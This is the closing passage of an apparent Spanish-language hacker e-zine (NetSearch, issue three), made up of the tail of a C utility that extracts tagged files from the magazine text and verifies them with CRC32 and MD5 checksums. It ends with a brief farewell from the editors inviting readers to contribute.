    buffer[0] += a;
    buffer[1] += b;
    buffer[2] += c;
    buffer[3] += d;
}

#endif

int hex_digit(int c)
{
        if (c >= '0' && c <= '9')
                return c - '0';
        if (c >= 'a' && c <= 'f')
           return c - 'a' + 10;
        return -1;
}
                                                        
int mdfile(FILE *archivo, unsigned char *digest)
{
        unsigned char buffer[1024];
        MD5_CTX ctx;
        int n;
        
        
        fseek(archivo,0,SEEK_SET);
        MD5Init(&ctx);
        while ((n = fread(buffer, 1, sizeof(buffer), archivo)) > 0)
                MD5Update(&ctx, buffer, n);
        MD5Final(digest, &ctx);
        if (ferror(archivo))
                return -1;
        return 0;
}

unsigned long crcTable[256];

void crcgen() 
{
  unsigned long crc, poly;
  int i, j;
  poly = 0xEDB88320L;
  for (i=0; i<256; i++) {
     crc = i;
     for (j=8; j>0; j--) {
        if (crc&1) {
           crc = (crc >> 1) ^ poly;
           } 
        else {
           crc >>= 1;
        }
     }
     crcTable[i] = crc;
  }
}
        
unsigned long check_crc( FILE *fp )
{
   register unsigned long crc;
   int c;

   crc = 0xFFFFFFFF;
   while( (c=getc(fp)) != EOF ) {
         crc = ((crc>>8) & 0x00FFFFFF) ^ crcTable[ (crc^c) & 0xFF ];
   }
 
   fseek(fp,0,SEEK_SET);   

   return( crc^0xFFFFFFFF );

}

void tmp_digest(unsigned char *p, unsigned char *digest_tmp)
{
        int i;
      
        for (i = 0; i < 16; ++i)
           sprintf(&digest_tmp[i*2],"%02x", *p++);
}

int main(int argc, char **argv)
{ 
    u_char b[256], *bp, *fn;
    unsigned char digest_f[32];
    int i, j = 0, h_c = 0, k,h_md5,d1=0,d2=0;
    unsigned long crc=0, crc_f=0;
    unsigned char digest[16], digest_tmp[32];
    FILE *in_p, *out_p = NULL; 
    struct f_name *fn_p = NULL, *head = NULL; 

    if (argc < 2)
    {
        printf("Uso: %s archivo1 archivo2 ... archivon\n", argv[0]);
        exit(0); 
    }

    for (i = 1; (fn = argv[i++]); ) 
    {
        if (!head) 
        {
            if (!(head = (struct f_name *)malloc(sizeof(struct f_name))))
            {
                perror("malloc");
                exit(1);
            }
            strncpy(head->name, fn, sizeof(head->name)); 
            head->next = NULL; 
            fn_p = head; 
        }
        
        else
        {
            if (!(fn_p->next = (struct f_name *)malloc(sizeof(struct f_name))))
            {
                perror("malloc");
                exit(1);
            }
            fn_p = fn_p->next;
            strncpy(fn_p->name, fn, sizeof(fn_p->name));
            fn_p->next = NULL;
        }
    }
    
    if (!(fn_p->next = (struct f_name *)malloc(sizeof(struct f_name))))
    {
        perror("malloc");
        exit(1);
     }
    fn_p = fn_p->next;
    fn_p->next = NULL;

    for (fn_p = head; fn_p->next; fn_p = fn_p->next)
    {
        if (!(in_p = fopen(fn_p->name, "r")))
        {
            fprintf(stderr, "No se puede abrir el archivo original %s.\n", fn_p->name);
	    continue; 
        }
        else fprintf(stderr, "%s abierto\n", fn_p->name);
        
        crcgen(); 
        
        while (fgets(b, 256, in_p))
        { 
             if (!strncmp (b, BEGIN_TAG, BT_SIZE))
            { 
	        b[strlen(b) - 1] = 0;  
                j++;
                  
                /* crc=0;
                   crc_f=0;    X-DDD */
                
                if ((bp = strchr(b + BT_SIZE + 1, '/')))
                {
                    while (bp)
                    {
		        *bp = 0;   
		        mkdir(b + BT_SIZE, 0700); 
		        *bp = '/'; 
		        bp = strchr(bp + 1, '/');  
		    }
                }
                
                
                if((bp=strchr(b,'!')))
                {
                   crc_f=strtoul((b + (strlen(b)-strlen(bp)) + 1),NULL,16);
                   b[strlen(b) - strlen(bp) - 1 ]=0; 
                   h_c=1; 
                   h_md5=0;
                }
                else
                {
                   h_c=0;
                   if((bp=strchr(b,'$')))
                   {
                   	d2=0;
                        if(strlen(bp) < 33)
                           d2=1;                    
                        memcpy(&digest_f,bp+1,32);
                        b[strlen(b) - strlen(bp) - 1] =0;
                        h_md5=1;
                   }
                   else
                   {
                      h_c=0;
                      h_md5=0;
                   }
                }  
                         
                if ((out_p = fopen(b + BT_SIZE, "wb+")))
                   printf("- Extrayendo %s\n ", b + BT_SIZE);
                else
                {
		    printf("No se puede extraer '%s'.\n", b + BT_SIZE);
		    continue;
	        }
                
	    } 
   
            else if (!strncmp (b, END_TAG, ET_SIZE))
            {
	        
            
                if (out_p)  
                {
                    if(h_c==1) 
                    {
                        fseek(out_p,0l,0);
                        crc=check_crc(out_p); 
                        
                        if(crc==crc_f)
                           printf("            crc32 = %08lx  ... comprobado\n ",crc);
                        else
                           printf("            crc32 -> %08lx - %08lx  no coincide!\n ",crc,crc_f);
                        
                    }
                    if(h_md5==1)
                    {
                    	mdfile(out_p,digest);
                        tmp_digest(digest,digest_tmp);
                                            	           
                        for(k=0;k<32;k++)
                        {
                           if(digest_f[k] != digest_tmp[k])
                              d1=1;
                        }
                        if(d1==0)
                           printf(" md5 : %s -- ok!\n",digest_f);
                        else
                        {
                           if(d2==0)
                                printf("  md5! %s  <-- md5 suministrado.\n",digest_f);
                           else
                               	printf(" md5!  Codigo MD5 suministrado incompleto.\n");          
                           printf("        %s  <-- md5 correcto.\n",digest_tmp);
                        }   
                        d1=0;
                    }
                    /* nos vamos */    
                    fclose(out_p);
                    
                }    
	        else 
                {
	            fprintf(stderr, "Error al cerrar el archivo %s.\n", fn_p->name);
		    continue;
	        }
            } 
            else if (out_p)
            {
                fputs(b, out_p);
            }
        }
    }
    if (!j) printf("No se han encontrado etiquetas de extraccion.\n");
    else printf("Extraidos %d archivo(s).\n", j);
    return (0);
}


=[01101b]=====================================================================
=[Despedida]==================================================================
=[por NetSearch]==============================================================


     Bueno, llegamos al final de este tercer numero. Como siempre decimos,
esperando que nos podamos despedir de vosotros otra y otra vez mas. Como
siempre, no dejaremos de rallaros con que hace falta vuestra colaboracion,
asi que no dejeis de escribir :P. Pues venga, saludos, y hasta el numero
cuatro que seguro lo tendreis en vuestras pantallas en menos de tres meses.
Tranquis, he dicho menos xD.

Saludos,

NetSearch

<-End-of-File->

